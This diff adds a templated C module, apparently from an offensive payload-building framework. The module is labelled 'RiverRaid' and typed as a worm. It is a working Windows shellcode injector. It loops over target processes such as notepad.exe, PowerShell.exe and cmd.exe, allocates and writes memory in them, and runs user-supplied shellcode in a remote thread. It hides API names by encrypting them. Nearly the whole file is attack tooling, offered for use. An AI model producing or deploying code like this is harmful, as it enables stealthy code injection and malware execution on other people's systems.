@@ -1,0 +1,110 @@
+#!name##RiverRaid
+#!itemType##worm
+#!info##A shellcode injector. It uses the Chip and Dale library and injects shellcode using NT functions. It searches for processes from a given list and injects the shellcode into them, repeating the search until successful with configurable time delays between attempts.
+#!info## The names of functions, processes, etc. are encrypted.
+#!lang##c
+#!itemTags##WIN##EXE
+#!wormCompiler##Basic-C
+#!Wprocess##BasicProc
+#!reqMod##ChipAndDale
+#!Var##RRS_targets##notepad.exe, PowerShell.exe, cmd.exe##Names of target processes into which the shellcode will be injected.. Separate names with commas ","##str
+#!Var##RRS_pause##20##The interval (in seconds) between re-searching for processes.##str
+#!payloadSpace##RRS_scode##Your shellcode
+#!inFile##ChipDaleC_H##chip_and_dale.h
+#!inFile##ChipDaleC_C##chip_and_dale.c
+#!inFile##RiverRaid_H##river_raid.h
+#!inFile##RiverRaid_C##river_raid.c
+#!inFile##RiverRaidStore_C##rr_store.c
+#!inFile##RiverRaidStore_H##rr_store.h
+
+{% set CHIP_AND_DALE_ENCODE_KEY = shTOOL.DaleBuildKey(CAD_eKEY) %}
+
+#include <stdio.h>
+#include "chip_and_dale.h"
+#include "river_raid.h"
+#include "rr_store.h"
+
+#define RR_PAUSE_FIND_PROCESS {{RRS_pause}}
+
+typedef void (*typefSleep)(DWORD);
+
+
+void RR_Sleep(DWORD pause) {
+    char fname[] = {
+        {{ shTOOL.DaleShadow("Sleep", CHIP_AND_DALE_ENCODE_KEY) }}
+    };
+    typefSleep rSleep = CDF_GetFuncEnc(fname, CDV_ADDR_KERNEL32);
+    return rSleep(pause);
+}
+
+HANDLE RR_FindProcess(void) {
+    HANDLE mProc;
+    DWORD pid;
+    char *target = RR_GetTarget();
+    while (target) {
+        pid = raid_FindProcessPID(target);
+        if (pid) {
+            mProc = raid_OpenProcFull(pid);
+            if (mProc) {
+                return mProc;
+            }
+        }
+        target = RR_GetTarget();
+    }
+    return 0;
+
+}
+
+int RR_Inject(HANDLE proc) {
+    PVOID mem_addr = NULL;
+    SIZE_T fuel_size = RR_GetFuelSize();
+    SIZE_T mem_size = fuel_size + 32;
+    HANDLE myTH;
+    NTSTATUS out1 = raid_AllocMemory(proc, &mem_addr, &mem_size);
+    if (out1 != 0) {
+        printf("ERROR: %x\n", out1);
+        return 0;
+    }
+    unsigned char *rscode = RR_GetFuel();
+    NTSTATUS out2 = raid_WriteMemory(proc, mem_addr, rscode, fuel_size);
+    if (out2 != 0) {
+        printf("ERROR Write Mem: %x\n", out2);
+        return 0;
+    }
+    
+    printf("Write Mem: %x\n", out2);
+    free(rscode);
+    NTSTATUS out3 = raid_CreateTh(&myTH, proc, mem_addr, 0);
+    if (out3 != 0) {
+        return 0;
+    }
+    raid_CloseHandle(proc);
+    return 1;
+}
+
+void RR_Work(void) {
+    HANDLE proc;
+    while (1) {
+        proc = RR_FindProcess();
+        if (proc) {
+            int out = RR_Inject(proc);
+            if (out != 0) {
+                break;
+            }
+        }
+        else {
+            RR_Sleep(RR_PAUSE_FIND_PROCESS * 1000);
+            RR_ResetTargets();
+        }
+    }
+}
+
+int main(void) {
+    printf("START\n");
+    CDF_Initialize();
+    RiverRaidInit();
+    RR_Work();
+
+    printf("END\n");
+    return 0;
+}
